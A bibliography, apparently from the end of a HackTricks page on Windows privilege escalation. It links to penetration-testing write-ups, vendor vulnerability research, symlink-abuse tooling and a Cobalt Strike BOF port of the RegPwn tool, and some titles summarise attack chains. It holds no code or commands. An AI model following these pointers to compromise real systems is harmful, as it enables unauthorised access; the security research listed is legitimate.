- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)

{{#include ../../banners/hacktricks-training.md}}
